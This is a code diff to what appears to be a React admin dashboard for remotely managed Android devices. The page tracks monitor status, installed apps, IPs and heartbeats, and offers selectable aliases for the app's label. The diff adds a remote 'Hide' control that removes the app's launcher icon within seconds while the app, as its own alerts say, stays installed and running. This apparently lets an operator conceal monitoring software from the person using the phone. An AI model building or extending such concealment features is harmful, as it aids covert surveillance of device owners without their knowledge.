@@ -8,7 +8,7 @@ type Device = {
   deviceId:string; model:string; androidVersion:string; appVersion:string;
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
-  ip?:string; userAgent?:string; alias?:string; appLabel?:string;
+  ip?:string; userAgent?:string; alias?:string; appLabel?:string; hidden?:boolean;
 };
 
 const ALIAS_OPTIONS = [
@@ -66,6 +66,18 @@ export default function DeviceDetail(){
           else alert(`Rename failed: ${j.error}`);
         }} className={`text-sm px-4 py-1.5 rounded-lg border ${(dev.alias||"uncry")===o.key?"bg-slate-800 text-white border-slate-800":"hover:bg-gray-100"}`}>{o.label}</button>
       ))}</div>
+    </div>
+
+    <div className="border rounded-2xl p-4 mt-4">
+      <div className="text-xs text-gray-500">Launcher icon</div>
+      <div className="text-sm mt-1">Currently <span className="font-semibold">{dev.hidden?"hidden (in launcher, still installed + running)":"visible"}</span></div>
+      <button onClick={async()=>{
+        const visible=!dev.hidden;
+        const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/visibility`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({visible})});
+        const j=await r.json();
+        if(r.ok) alert(visible?`Visible queued — ${dev.deviceId.slice(0,8)} icon returns within 5s`:`Hide queued — ${dev.deviceId.slice(0,8)} icon disappears within 5s (app stays installed + running)`);
+        else alert(`Visibility failed: ${j.error}`);
+      }} className={`text-sm px-4 py-1.5 rounded-lg mt-3 ${dev.hidden?"bg-emerald-600 text-white hover:bg-emerald-700":"border hover:bg-gray-100"}`}>{dev.hidden?"Visible":"Hide"}</button>
     </div>
 
     <div className="grid grid-cols-2 gap-4 mt-6">
